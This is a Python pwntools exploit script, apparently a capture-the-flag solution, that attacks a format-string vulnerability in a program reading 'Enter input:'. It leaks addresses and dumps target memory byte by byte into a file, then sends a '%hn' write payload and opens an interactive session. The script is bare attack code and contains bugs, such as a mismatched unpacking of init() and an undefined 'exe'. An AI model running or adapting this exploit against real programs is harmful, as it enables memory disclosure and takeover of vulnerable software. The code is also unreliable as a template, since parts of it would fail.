#!/usr/bin/env python3
import os
import sys
import subprocess
from time import sleep
from pwn import *

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT
        log.info("Connecting to remote " + str(host) + " " + str(port_val))
        return remote(host, port_val)
    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


line = b"Enter input: "

def leak_at(io, index):
    io.sendlineafter(line, f"%{index}$p".encode())
    return int(io.recvline().strip(), 16)

def init():
    io = start()
    leak_line = io.recvline().split(b": ")[1]
    leak = int(leak_line, 16)
    candidato = leak_at(io, 73) - 0x40
    success(f"candidato @ {hex(candidato)}")
    success(f"stdin @ {hex(leak)}")

    if '0a' in hex(candidato):
        error(f"\\n dentro il candidato")
    return io, candidato, leak

io, candidato, leak = init()
file = open("dump.bin", "ab")
st = os.path.getsize("dump.bin") if os.path.exists("dump.bin") else 0
end = 20000
bytes_written = 0
max_retries = 3

for i in range(st, end):
    addr_int = candidato + i
    addr = p64(addr_int)

    if b"\n" in addr:
        warning(f"[{i:04x}] Skip (trovato \\n) -> addr={addr_int:#x}")
        byte = b"\x00"
    else:
        fmt = b"%7$s----" + addr
        byte = None

        for attempt in range(1, max_retries + 1):
            try:
                io.sendlineafter(line, fmt)
                data = io.recvuntil(b"----")
                leak = data[:-4]
                byte = leak[:1] if leak else b"\x00"
                break  # Lettura riuscita, esce dal loop dei retry

            except EOFError:
                warning(f"[{i:04x}] Crash! Retry {attempt}/{max_retries} -> addr={addr_int:#x}")
                io.close()
                info("zzzz...")
                sleep(2)
                io, candidato = init()
                addr_int = candidato + i
                addr = p64(addr_int)
                fmt = b"%7$s----" + addr

            except KeyboardInterrupt:
                warning("Interrotto dall'utente.")
                io.close()
                file.close()
                sys.exit(0)

        if byte is None:
            warning(f"[{i:04x}] Falliti tutti i {max_retries} tentativi! Assegno \\x00 a addr={addr_int:#x}")
            byte = b"\x00"

    file.write(byte)
    file.flush()
    bytes_written += 1
    info(f"{i:04x} | {addr_int:#018x} | {byte.hex():>2} | progress={i}/{end}")

file.close()

info(f"Appended {bytes_written} bytes to dump.bin")
info(f"Final size: {os.path.getsize('dump.bin')} bytes")

io, candidato, leak = init()
addr = p64(candidato + 0x4012)
fmt = f"%26465c%8$hnFSOP".encode()
fmt = fmt.ljust(16, b'a') + addr
io.sendlineafter(line, fmt)
io.interactive()
